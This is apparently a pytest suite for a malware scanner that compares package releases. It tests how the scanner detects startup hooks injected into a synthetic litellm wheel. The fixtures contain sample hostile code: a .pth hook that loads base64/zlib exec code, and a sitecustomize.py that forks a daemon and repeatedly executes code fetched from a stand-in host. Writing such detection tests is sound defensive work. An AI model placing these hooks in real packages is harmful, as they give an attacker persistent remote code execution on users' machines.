"""Startup hooks a wheel installs next to the package. Synthetic trees of made-up, inert text only."""

from __future__ import annotations

from datetime import timedelta

import pytest

from hunter.bands import ALERT_THRESHOLD, REVIEW_FLOOR
from hunter.classify import RULE_FALLBACK_SIGNAL, classification_incomplete, classify_files
from hunter.config import Config
from hunter.db import NEVER_PARK_RANK, Database, utcnow
from hunter.fake_jev import KeywordJev, RaisingJev
from hunter.features import (
    build_config_changes,
    extract_features,
    outside_package_files,
    payload_indicators,
    pth_imported_modules,
    wheel_only_files,
)
from hunter.head import load_head
from hunter.investigate import build_evidence, jev_passes_complete, should_investigate
from hunter.jev import JevUnavailable
from hunter.models import ReleaseMeta
from hunter.rules import scan_release
from hunter.service import classify_job
from hunter.triage import categorize, diff_trees, pth_import_lines
from hunter.webhook import jev_evidence_complete, should_deliver_analysis

OLD_PYPROJECT = (
    '[build-system]\nrequires = ["maturin>=1.5"]\nbuild-backend = "maturin"\n\n'
    '[project]\nname = "litellm"\nversion = "1.106.2"\n\n'
    '[tool.maturin]\npython-source = "python"\nmodule-name = "litellm._core"\n'
)
NEW_PYPROJECT = OLD_PYPROJECT.replace('version = "1.106.2"', 'version = "1.107.0"') + 'data = "cook"\n'
INIT = "from ._core import version\n__all__ = ['version']\n"
# Made-up stand-ins with the same shape as the incident files. The blob is not a real payload.
COOK_PTH = "import cook"
COOK_PY = "import zlib as qvzr, base64 as mtkp; exec(qvzr.decompress(mtkp.b64decode(b'AAAA')))\n"
SITECUSTOMIZE = (
    "import os, time\n"
    "from urllib.request import urlopen\n"
    "if os.fork() == 0:\n"
    "    os.setsid()\n"
    "    while True:\n"
    "        exec(urlopen('https://updates.example.invalid/c').read())\n"
    "        time.sleep(3600)\n"
)
PURELIB = "wheel/litellm-1.107.0.data/purelib/"


def _dist_info(version: str) -> dict[str, str]:
    base = f"wheel/litellm-{version}.dist-info/"
    return {
        base + "METADATA": f"Metadata-Version: 2.1\nName: litellm\nVersion: {version}\n",
        base + "WHEEL": "Wheel-Version: 1.0\nGenerator: maturin\nRoot-Is-Purelib: false\n",
        base + "RECORD": "litellm/__init__.py,,\n",
    }


def litellm_trees() -> tuple[dict[str, str], dict[str, str]]:
    """1.106.2 against 1.107.0 after archive alignment: sdist/ and wheel/ roots."""
    old = {
        "sdist/pyproject.toml": OLD_PYPROJECT,
        "sdist/python/litellm/__init__.py": INIT,
        "sdist/src/lib.rs": "fn version() {}\n",
        "wheel/litellm/__init__.py": INIT,
        "wheel/litellm/_core.cpython-312-x86_64-linux-gnu.so": "[binary-or-media-file]\nheader: elf\n",
        **_dist_info("1.106.2"),
    }
    new = {
        "sdist/pyproject.toml": NEW_PYPROJECT,
        "sdist/python/litellm/__init__.py": INIT,
        "sdist/src/lib.rs": "fn version() {}\n",
        "wheel/litellm/__init__.py": INIT,
        "wheel/litellm/_core.cpython-312-x86_64-linux-gnu.so": "[binary-or-media-file]\nheader: elf\n",
        **_dist_info("1.107.0"),
        PURELIB + "cook.pth": COOK_PTH,
        PURELIB + "cook.py": COOK_PY,
        PURELIB + "sitecustomize.py": SITECUSTOMIZE,
    }
    return old, new


def _rules_by_path(old, new) -> dict[str, set[str]]:
    found: dict[str, set[str]] = {}
    report = scan_release(old, new, ecosystem="pypi")
    for hit in report.hits:
        found.setdefault(hit.path, set()).add(hit.rule)
    return found


def test_litellm_layout_keeps_all_three_startup_files():
    old, new = litellm_trees()
    kept = {item.path: item.category for item in diff_trees(old, new)}
    assert kept[PURELIB + "cook.pth"] == "install_scripts"
    assert kept[PURELIB + "sitecustomize.py"] == "install_scripts"
    assert PURELIB + "cook.py" in kept
    assert kept["sdist/pyproject.toml"] == "install_scripts"


def test_litellm_layout_hits_the_startup_rules_on_each_startup_file():
    old, new = litellm_trees()
    report = scan_release(old, new, ecosystem="pypi")
    found = _rules_by_path(old, new)
    assert "pth_import_line" in found[PURELIB + "cook.pth"]
    assert "py_exec_decoded" in found[PURELIB + "cook.py"]
    assert {"py_startup_hook_file", "py_daemon_fetch_exec"} <= found[PURELIB + "sitecustomize.py"]
    tiers = {hit.rule: hit.tier for hit in report.hits}
    # A startup hook on its own is weak. It only counts with what the hook loads.
    assert tiers["pth_import_line"] == "weak"
    assert tiers["py_startup_hook_file"] == "weak"
    assert report.verdict == "malicious"


def test_startup_rules_skip_files_the_old_release_already_shipped():
    old, new = litellm_trees()
    found = _rules_by_path(new, {**new, "wheel/litellm/__init__.py": INIT + "x = 1\n"})
    assert not any({"pth_import_line", "py_startup_hook_file"} & rules for rules in found.values())


def test_startup_rules_skip_a_hook_that_moved_with_the_version_directory():
    old, new = litellm_trees()
    old_next = {path.replace("1.107.0", "1.106.2"): text for path, text in new.items()}
    newer = {path.replace("1.107.0", "1.107.1"): text for path, text in new.items()}
    found = _rules_by_path(old_next, newer)
    assert not any({"pth_import_line", "py_startup_hook_file"} & rules for rules in found.values())


# Third-party startup hooks the previous release already shipped, synthetic but the same shape.
PYWIN32_STYLE_PTH = "# .pth file for the PyWin32 extensions\nwin32\nwin32/lib\nPythonwin\nimport pywin32_bootstrap\n"
COVERAGE_STYLE_PTH = "import os; exec(os.environ.get('WIDGET_COVER_START') and 'import widget_cover; widget_cover.go()' or '')\n"


def _hook_release(pth_name: str, pth_text: str, new_pth_text: str | None = None):
    old = {
        "wheel/widget/__init__.py": "VERSION = '1.0'\n",
        "wheel/widget_bootstrap.py": "import os\nos.environ.setdefault('WIDGET_HOME', '')\n",
        f"wheel/{pth_name}": pth_text,
        "wheel/widget-1.0.dist-info/RECORD": "widget/__init__.py,,\n",
    }
    new = {
        "wheel/widget/__init__.py": "VERSION = '1.1'\n",
        "wheel/widget_bootstrap.py": old["wheel/widget_bootstrap.py"],
        f"wheel/{pth_name}": pth_text if new_pth_text is None else new_pth_text,
        "wheel/widget-1.1.dist-info/RECORD": "widget/__init__.py,,\n",
    }
    return old, new


@pytest.mark.parametrize(("pth_name", "pth_text"), [("pywin32.pth", PYWIN32_STYLE_PTH), ("a1_cover.pth", COVERAGE_STYLE_PTH)])
def test_unchanged_third_party_startup_hooks_do_not_fire(pth_name, pth_text):
    old, new = _hook_release(pth_name, pth_text)
    report = scan_release(old, new, ecosystem="pypi")
    assert [hit for hit in report.hits if hit.path.endswith(".pth")] == []
    kept = {item.path: item.category for item in diff_trees(old, new)}
    assert f"wheel/{pth_name}" not in kept


def test_a_changed_pth_counts_only_its_new_import_lines():
    edited = PYWIN32_STYLE_PTH.replace("Pythonwin\n", "Pythonwin\nwin32/extra\n")
    old, new = _hook_release("pywin32.pth", PYWIN32_STYLE_PTH, edited)
    assert "pth_import_line" not in _rules_by_path(old, new).get("wheel/pywin32.pth", set())
    assert categorize("wheel/pywin32.pth", "win32/extra", edited, False) != "install_scripts"
    added = edited + "import widget_helper\n"
    old, new = _hook_release("pywin32.pth", PYWIN32_STYLE_PTH, added)
    report = scan_release(old, new, ecosystem="pypi")
    hit = next(hit for hit in report.hits if hit.rule == "pth_import_line")
    assert (hit.path, hit.line, hit.matched) == ("wheel/pywin32.pth", 7, "import widget_helper")
    assert categorize("wheel/pywin32.pth", "import widget_helper", added, False) == "install_scripts"


def test_a_changed_sitecustomize_counts_only_its_new_code_lines():
    hook = "import os\nos.environ.setdefault('WIDGET_HOME', '')\n"
    old = {"wheel/widget/__init__.py": "VERSION = '1.0'\n", "wheel/sitecustomize.py": hook}
    same = {**old, "wheel/sitecustomize.py": hook + "# a comment\n"}
    assert "py_startup_hook_file" not in _rules_by_path(old, same).get("wheel/sitecustomize.py", set())
    edited = {**old, "wheel/sitecustomize.py": hook + "os.environ.setdefault('WIDGET_MODE', 'x')\n"}
    assert "py_startup_hook_file" in _rules_by_path(old, edited)["wheel/sitecustomize.py"]


# The .pth stubs written by setuptools, virtualenv, and namespace-package installs.
BENIGN_PTH = {
    "__editable__.widget-1.0.pth": (
        "import __editable___widget_1_0_finder; __editable___widget_1_0_finder.install()\n"
    ),
    "distutils-precedence.pth": (
        "import os; var = 'SETUPTOOLS_USE_DISTUTILS'; enabled = os.environ.get(var, 'local') == 'local'; "
        "enabled and __import__('_distutils_hack').add_shim(); \n"
    ),
    "widget_ns-1.0-py3.12-nspkg.pth": (
        "import sys, types, os;has_mfs = sys.version_info > (3, 5);"
        "p = os.path.join(sys._getframe(1).f_locals['sitedir'], *('widget_ns',))\n"
    ),
    "_virtualenv.pth": "import _virtualenv\n",
    "widget.pth": "/home/dev/src/widget\n",
}


def test_benign_pth_stubs_do_not_hit_or_get_kept_as_install_scripts():
    old = {"wheel/widget/__init__.py": "VERSION = '1.0'\n"}
    for name, text in BENIGN_PTH.items():
        new = {**old, f"wheel/{name}": text}
        assert pth_import_lines(name, text) == [], name
        assert categorize(f"wheel/{name}", text, text, True) != "install_scripts", name
        found = _rules_by_path(old, new)
        assert "pth_import_line" not in found.get(f"wheel/{name}", set()), name


def test_a_stub_name_with_a_different_import_still_hits():
    old = {"wheel/widget/__init__.py": "VERSION = '1.0'\n"}
    new = {**old, "wheel/distutils-precedence.pth": "import helper_mod\n"}
    assert "pth_import_line" in _rules_by_path(old, new)["wheel/distutils-precedence.pth"]
    new = {**old, "wheel/_virtualenv.pth": "import _virtualenv; import helper_mod\n"}
    assert "pth_import_line" in _rules_by_path(old, new)["wheel/_virtualenv.pth"]


def test_a_new_hook_outside_the_stub_list_is_weak():
    old = {"wheel/widget/__init__.py": "VERSION = '1.0'\n"}
    new = {**old, "wheel/_widget_editable.pth": "import _widget_editable\n"}
    report = scan_release(old, new, ecosystem="pypi")
    assert [(hit.rule, hit.tier) for hit in report.hits] == [("pth_import_line", "weak")]
    assert report.verdict == "unsure"


def test_ordinary_wheel_without_startup_files_has_no_startup_hits():
    old = {"wheel/widget/__init__.py": "VERSION = '1.0'\n", "wheel/widget/core.py": "def f():\n    return 1\n"}
    new = {
        "wheel/widget/__init__.py": "VERSION = '1.1'\n",
        "wheel/widget/core.py": "def f():\n    return 2\n",
        "wheel/widget/extra.py": "import os\n\ndef g():\n    return os.getcwd()\n",
    }
    found = _rules_by_path(old, new)
    hits = set().union(*found.values()) if found else set()
    assert not {"pth_import_line", "py_startup_hook_file", "py_daemon_fetch_exec"} & hits


def test_daemon_rule_needs_both_the_fork_and_the_fetch():
    plain_daemon = "import os\nif os.fork() == 0:\n    os.setsid()\n    exec(compile(src, 'x', 'exec'))\n"
    plain_fetch = "from urllib.request import urlopen\nexec(urlopen(U).read())\n"
    for text in (plain_daemon, plain_fetch):
        found = _rules_by_path({}, {"widget/run.py": text})
        assert "py_daemon_fetch_exec" not in found.get("widget/run.py", set())


STARTUP_FILES = [PURELIB + "cook.pth", PURELIB + "cook.py", PURELIB + "sitecustomize.py"]


def _meta(name: str = "litellm", old: str = "1.106.2", new: str = "1.107.0") -> ReleaseMeta:
    return ReleaseMeta(
        ecosystem="pypi",
        name=name,
        old_version=old,
        new_version=new,
        rank=40,
        registry_url=f"https://pypi.org/project/{name}/{new}/",
    )


def _bare(paths: list[str]) -> list[str]:
    return [path.removeprefix("wheel/") for path in paths]


def test_litellm_layout_flags_all_three_files_and_the_build_config_change():
    old, new = litellm_trees()
    assert outside_package_files(old, new, "litellm") == _bare(sorted(STARTUP_FILES))
    assert wheel_only_files(old, new) == _bare(sorted(STARTUP_FILES))
    assert build_config_changes(old, new) == ['tool.maturin data = "cook"']
    code = extract_features(old, new, diff_trees(old, new), _meta())
    signals = code.signal_list()
    assert any(item.startswith("outside_package_install:") and "purelib/cook.pth" in item for item in signals)
    assert any(item.startswith("wheel_only_file:") and "purelib/sitecustomize.py" in item for item in signals)
    assert 'build_config_change:tool.maturin data = "cook"' in signals
    assert code.static_hot()


def test_litellm_layout_is_reviewed_and_scout_sees_the_structural_notes(monkeypatch):
    monkeypatch.setenv("HUNTER_RULES", "on")
    old, new = litellm_trees()
    jev = KeywordJev()
    row = classify_files(meta=_meta(), old_files=old, new_files=new, jev=jev, head=load_head())
    assert row.band in {"review", "alert"}
    assert row.malice_probability >= 0.62
    assert row.rule_verdict == "malicious"
    assert any(item.startswith("outside_package_install:") for item in row.signals)
    assert any(item.startswith("build_config_change:") for item in row.signals)
    sent = "".join(str(call["state"].get("diff_excerpt") or "") for call in jev.calls)
    assert "local_signal outside_package_install:" in sent


def test_outside_package_install_floors_review_with_the_rules_off(monkeypatch):
    monkeypatch.delenv("HUNTER_RULES", raising=False)
    old = {"wheel/widget/__init__.py": "VERSION = '1.0'\n"}
    new = {"wheel/widget/__init__.py": "VERSION = '1.1'\n", "wheel/helper_mod.py": "VALUE = 1\n"}
    row = classify_files(meta=_meta("widget", "1.0", "1.1"), old_files=old, new_files=new, jev=KeywordJev(), head=load_head())
    assert row.band in {"review", "alert"}
    assert "outside_package_install:helper_mod.py" in row.signals


def _clean_native_trees() -> tuple[dict[str, str], dict[str, str]]:
    """A compiled-extension package: the wheel holds build output the sdist never does."""
    so = "[binary-or-media-file]\nheader: elf\n"
    old = {
        "sdist/pyproject.toml": '[project]\nname = "fastwidget"\n\n[tool.maturin]\nmodule-name = "fastwidget._core"\n',
        "sdist/fastwidget/__init__.py": "from ._core import run\n",
        "sdist/src/lib.rs": "fn run() {}\n",
        "wheel/fastwidget/__init__.py": "from ._core import run\n",
        "wheel/fastwidget/_core.cpython-312-x86_64-linux-gnu.so": so,
        "wheel/fastwidget-1.0.dist-info/RECORD": "fastwidget/__init__.py,,\n",
    }
    new = {
        "sdist/pyproject.toml": old["sdist/pyproject.toml"].replace("\n\n[tool.maturin]", '\nversion = "1.1"\n\n[tool.maturin]'),
        "sdist/fastwidget/__init__.py": "from ._core import run, stop\n",
        "sdist/fastwidget/helpers.py": "def wrap(x):\n    return x\n",
        "sdist/src/lib.rs": "fn run() {}\nfn stop() {}\n",
        "sdist/src/speedups.c": "int add(int a, int b) { return a + b; }\n",
        "wheel/fastwidget/__init__.py": "from ._core import run, stop\n",
        "wheel/fastwidget/helpers.py": "def wrap(x):\n    return x\n",
        "wheel/fastwidget/_version.py": "__version__ = '1.1'\n",
        "wheel/fastwidget/proto/msg_pb2.py": "DESCRIPTOR = None\n",
        "wheel/fastwidget/_core.cpython-312-x86_64-linux-gnu.so": so,
        "wheel/_speedups.cpython-312-x86_64-linux-gnu.so": so,
        "wheel/fastwidget.libs/libz-abc123.so.1": so,
        "wheel/fastwidget-1.1.data/scripts/fastwidget": "#!python\nfrom fastwidget import run\nrun()\n",
        "wheel/fastwidget-1.1.data/headers/fastwidget.h": "int run(void);\n",
        "wheel/fastwidget_ns-1.1-py3.12-nspkg.pth": BENIGN_PTH["widget_ns-1.0-py3.12-nspkg.pth"],
        "wheel/fastwidget_paths.pth": "/opt/fastwidget/lib\n",
        "wheel/fastwidget-stubs/__init__.pyi": "def run() -> None: ...\n",
        "wheel/fastwidget-1.1.dist-info/RECORD": "fastwidget/__init__.py,,\n",
    }
    return old, new


def test_clean_compiled_extension_wheel_against_its_sdist_has_no_structural_signals():
    old, new = _clean_native_trees()
    assert outside_package_files(old, new, "fastwidget") == []
    assert wheel_only_files(old, new) == []
    assert build_config_changes(old, new) == []
    found = scan_release(old, new, ecosystem="pypi")
    assert not {"pth_import_line", "py_startup_hook_file"} & {hit.rule for hit in found.hits}


@pytest.mark.parametrize(
    "old_wheel",
    [
        {},
        {"sdist/widget/__init__.py": "VERSION = '1.0'\n"},
    ],
)
def test_no_previous_wheel_means_no_outside_package_signal(old_wheel):
    new = {"wheel/widget/__init__.py": "VERSION = '1.1'\n", "wheel/helper_mod.py": "VALUE = 1\n"}
    assert outside_package_files(old_wheel, new, "widget") == []
    assert wheel_only_files(old_wheel, {**new, "sdist/widget/__init__.py": "x\n"}) == []


def test_a_moved_purelib_file_and_an_unchanged_data_line_are_not_new():
    old, new = litellm_trees()
    old_next = {path.replace("1.107.0", "1.106.2"): text for path, text in new.items()}
    newer = {path.replace("1.107.0", "1.107.1"): text for path, text in new.items()}
    assert outside_package_files(old_next, newer, "litellm") == []
    assert wheel_only_files(old_next, newer) == []
    assert build_config_changes(old_next, newer) == []


def test_data_key_outside_the_maturin_table_is_not_a_build_config_change():
    old = {"sdist/pyproject.toml": '[project]\nname = "widget"\n'}
    new = {"sdist/pyproject.toml": '[project]\nname = "widget"\n\n[tool.other]\ndata = "assets"\n'}
    assert build_config_changes(old, new) == []


# A startup hook is strong only with a new top-level module that decodes and runs code or reaches
# the network. A hook on its own, or one that loads the package's own code, is weak: review at most.


def test_litellm_layout_reaches_the_strong_rule_floor_through_classify(monkeypatch):
    monkeypatch.setenv("HUNTER_RULES", "on")
    old, new = litellm_trees()
    report = scan_release(old, new, ecosystem="pypi")
    payload = {hit.path: hit for hit in report.hits if hit.rule == "startup_hook_payload"}
    assert set(payload) == {PURELIB + "cook.pth", PURELIB + "sitecustomize.py"}
    assert payload[PURELIB + "cook.pth"].tier == "strong"
    assert "decode_exec" in payload[PURELIB + "cook.pth"].matched
    assert "fetch_exec" in payload[PURELIB + "sitecustomize.py"].matched
    assert report.strong_floors["startup_hook_payload"] == "review"
    row = classify_files(meta=_meta(), old_files=old, new_files=new, jev=KeywordJev(), head=load_head())
    assert row.rule_verdict == "malicious"
    assert row.band in {"review", "alert"}
    assert row.malice_probability >= REVIEW_FLOOR
    assert row.needs_llm_review
    assert {"rule": "startup_hook_payload", "tier": "strong"}.items() <= next(
        hit for hit in row.rule_hits if hit["rule"] == "startup_hook_payload"
    ).items()


def _widget_wheels(extra_old: dict[str, str], extra_new: dict[str, str]):
    old = {
        "wheel/widget/__init__.py": "VERSION = '1.0'\n",
        "wheel/widget/_hook.py": "import os\nos.environ.setdefault('WIDGET_HOME', '')\n",
        "wheel/widget-1.0.dist-info/RECORD": "widget/__init__.py,,\n",
        **extra_old,
    }
    new = {
        "wheel/widget/__init__.py": "VERSION = '1.1'\n",
        "wheel/widget/_hook.py": old["wheel/widget/_hook.py"],
        "wheel/widget-1.1.dist-info/RECORD": "widget/__init__.py,,\n",
        **extra_new,
    }
    return old, new


def _payload_hits(old, new) -> list[str]:
    return [hit.path for hit in scan_release(old, new, ecosystem="pypi").hits if hit.rule == "startup_hook_payload"]


def test_a_new_pth_that_loads_existing_package_code_stays_review(monkeypatch):
    monkeypatch.setenv("HUNTER_RULES", "on")
    old, new = _widget_wheels({}, {"wheel/widget_hook.pth": "import widget._hook\n"})
    report = scan_release(old, new, ecosystem="pypi")
    assert [(hit.rule, hit.tier) for hit in report.hits] == [("pth_import_line", "weak")]
    row = classify_files(meta=_meta("widget", "1.0", "1.1"), old_files=old, new_files=new, jev=KeywordJev(), head=load_head())
    assert row.rule_verdict == "unsure"
    assert row.band == "review"
    assert row.malice_probability < ALERT_THRESHOLD
    assert not any(hit["tier"] == "strong" for hit in row.rule_hits)


FETCH_EXEC = "from urllib.request import urlopen\nexec(urlopen('https://x.example.invalid/c').read())\n"


@pytest.mark.parametrize(
    "extra_new",
    [
        # New top-level module with nothing that decodes, runs, or fetches.
        {"wheel/widget_hook.pth": "import widget_boot\n", "wheel/widget_boot.py": "X = 1\n"},
        # The fetch is in a new module inside the package folder, not next to it.
        {"wheel/widget_hook.pth": "import widget._net\n", "wheel/widget/_net.py": FETCH_EXEC},
        # The module the hook loads is not in this release.
        {"wheel/widget_hook.pth": "import widget_missing\n", "wheel/widget_other.py": FETCH_EXEC},
        # sitecustomize.py inside the package folder does not run at startup.
        {"wheel/widget/tests/sitecustomize.py": FETCH_EXEC},
    ],
)
def test_a_lone_startup_hook_does_not_reach_the_strong_rule(extra_new):
    old, new = _widget_wheels({}, extra_new)
    assert _payload_hits(old, new) == []


def test_the_strong_rule_needs_the_hook_and_the_module_to_be_new():
    hook = {"wheel/widget_hook.pth": "import widget_boot\n", "wheel/widget_boot.py": "X = 1\n"}
    # The old release already shipped the hook and the module. Only the module changed.
    old, new = _widget_wheels(hook, {**hook, "wheel/widget_boot.py": "X = 1\n" + FETCH_EXEC})
    assert _payload_hits(old, new) == []
    old, new = _widget_wheels({}, {**hook, "wheel/widget_boot.py": FETCH_EXEC})
    assert _payload_hits(old, new) == ["wheel/widget_hook.pth"]
    old, new = _widget_wheels({}, {"wheel/sitecustomize.py": FETCH_EXEC})
    assert _payload_hits(old, new) == ["wheel/sitecustomize.py"]
    old, new = _widget_wheels({"wheel/sitecustomize.py": "import os\n"}, {"wheel/sitecustomize.py": "import os\n" + FETCH_EXEC})
    assert _payload_hits(old, new) == []


def test_pth_import_parsing_and_payload_indicators():
    line = "import os, cook as c; from widget.sub import x; __import__('zed').go()"
    assert pth_imported_modules(line) == ["os", "cook", "widget", "zed"]
    assert payload_indicators(COOK_PY) == ["decode_exec"]
    assert payload_indicators(SITECUSTOMIZE) == ["fetch_exec"]
    assert payload_indicators("import socket\ns = socket.socket()\n") == ["network"]
    assert payload_indicators("import json\nexec(compile(json.loads(t), 'x', 'exec'))\n") == []


# Scout failure on a release a promoted rule marks malicious: Analyst decides, no silent block.


class _MemoryLoader:
    def __init__(self, meta, old_files, new_files):
        self.meta = meta
        self.old_files = old_files
        self.new_files = new_files

    def load(self, ecosystem, name, version, rank):
        return self.old_files, self.new_files, self.meta


def _down_row(monkeypatch, jev=None):
    monkeypatch.setenv("HUNTER_RULES", "on")
    old, new = litellm_trees()
    return classify_files(meta=_meta(), old_files=old, new_files=new, jev=jev or RaisingJev(), head=load_head())


def test_failed_scout_with_a_strong_rule_goes_to_analyst_instead_of_retrying(monkeypatch):
    row = _down_row(monkeypatch)
    assert row.band == "review"
    assert RULE_FALLBACK_SIGNAL in row.signals
    assert any(item.startswith("jev_pass_") for item in row.signals)
    assert not classification_incomplete(row)
    assert should_investigate(row)
    assert jev_passes_complete(row)
    evidence = build_evidence(row)
    assert jev_evidence_complete(evidence)
    assert should_deliver_analysis(evidence, "malicious", confirmed_by="analyst")
    assert not should_deliver_analysis(evidence, "malicious", confirmed_by="triage")
    assert not should_deliver_analysis(evidence, "uncertain", confirmed_by="analyst")


def test_failed_scout_without_a_rule_hit_still_defers(monkeypatch):
    monkeypatch.delenv("HUNTER_RULES", raising=False)
    old, new = litellm_trees()
    row = classify_files(meta=_meta(), old_files=old, new_files=new, jev=RaisingJev(), head=load_head())
    assert row.band == "deferred"
    assert RULE_FALLBACK_SIGNAL not in row.signals
    assert classification_incomplete(row)


def test_spend_stop_is_not_a_failure_and_stays_deferred(monkeypatch):
    class SpendStop:
        model = "jev-1.13.0"

        def system_one(self, state, questions):
            raise JevUnavailable("spend_cap_reached")

    row = _down_row(monkeypatch, SpendStop())
    assert row.band == "deferred"
    assert RULE_FALLBACK_SIGNAL not in row.signals


def test_jev_failure_signals_block_only_without_a_strong_rule():
    base = {"primary_band": "review", "jev_complete": False, "signals": ["jev_pass_b_failed", "gateway_503"]}
    assert not jev_evidence_complete(base)
    assert jev_evidence_complete({**base, "rule_verdict": "malicious"})
    strong = [{"rule": "startup_hook_payload", "tier": "strong", "path": "x.pth", "line": 1}]
    assert jev_evidence_complete({**base, "deterministic_findings": strong})
    weak = [{"rule": "h_shell", "tier": "weak", "path": "x.py", "line": 1}]
    assert not jev_evidence_complete({**base, "rule_verdict": "unsure", "deterministic_findings": weak})
    incomplete = {**base, "rule_verdict": "malicious", "signals": ["ai_incomplete", "jev_retry"]}
    assert not jev_evidence_complete(incomplete)
    assert not jev_evidence_complete({**base, "rule_verdict": "malicious", "primary_band": "deferred"})


def test_classify_job_queues_triage_for_a_rule_backed_release_when_scout_is_down(monkeypatch, tmp_path):
    monkeypatch.setenv("HUNTER_RULES", "on")
    old, new = litellm_trees()
    meta = _meta()
    db = Database(tmp_path / "hunter.sqlite3")
    config = Config(db_path=db.path, inspect_dependencies=False, investigate_url="https://triage.example.invalid/x")
    assert db.enqueue_job(meta.ecosystem, meta.name, meta.new_version, meta.rank)
    classify_job(db, config, db.pending_jobs()[0], jev=RaisingJev(), loader=_MemoryLoader(meta, old, new))
    stored = db.get_release(meta.ecosystem, meta.name, meta.new_version)
    assert stored["band"] == "review"
    assert RULE_FALLBACK_SIGNAL in stored["payload_json"]
    assert db.investigation_depth() == 1
    assert db.retry_depth() == 0


# Top ranked releases keep retrying instead of being parked for a human.


def _fail(db, rank, when, times):
    status = ""
    for _ in range(times):
        status = db.note_classify_failure(
            "pypi", "litellm", "1.107.0", rank, "jev_pass_b_failed", reason="jev_pass_b_failed",
            max_attempts=5, when=when,
        )
    return status


@pytest.mark.parametrize("rank", [1, 40, NEVER_PARK_RANK])
def test_top_ranked_release_is_never_parked(tmp_path, rank):
    db = Database(tmp_path / "hunter.sqlite3")
    when = utcnow().replace(microsecond=0)
    assert _fail(db, rank, when, 12) == "retrying"
    assert db.retry_depth() == 1
    assert db.human_review_depth() == 0
    due = db.due_classify_retries(when + timedelta(hours=2))
    assert [row["name"] for row in due] == ["litellm"]


@pytest.mark.parametrize("rank", [None, 0, NEVER_PARK_RANK + 1])
def test_other_releases_still_park_after_the_attempt_limit(tmp_path, rank):
    db = Database(tmp_path / "hunter.sqlite3")
    when = utcnow().replace(microsecond=0)
    assert _fail(db, rank, when, 5) == "exhausted"
    assert db.retry_depth() == 0


def test_a_parked_top_ranked_release_starts_retrying_again(tmp_path):
    db = Database(tmp_path / "hunter.sqlite3")
    when = utcnow().replace(microsecond=0)
    assert _fail(db, None, when, 5) == "exhausted"
    assert _fail(db, 40, when, 1) == "retrying"
    assert db.retry_depth() == 1


def test_a_pth_renamed_only_by_its_version_is_not_new():
    stub = "import sys, types, os;has_mfs = sys.version_info > (3, 5);p = os.path.join(sys._getframe(1).f_locals['sitedir'], *('google',))\n"
    old = {"wheel/protobuf-3.20.2-nspkg.pth": stub}
    new = {"wheel/protobuf-3.20.3-nspkg.pth": stub}
    report = scan_release(old, new, ecosystem="pypi")
    assert not [hit for hit in report.hits if hit.path.endswith(".pth")]
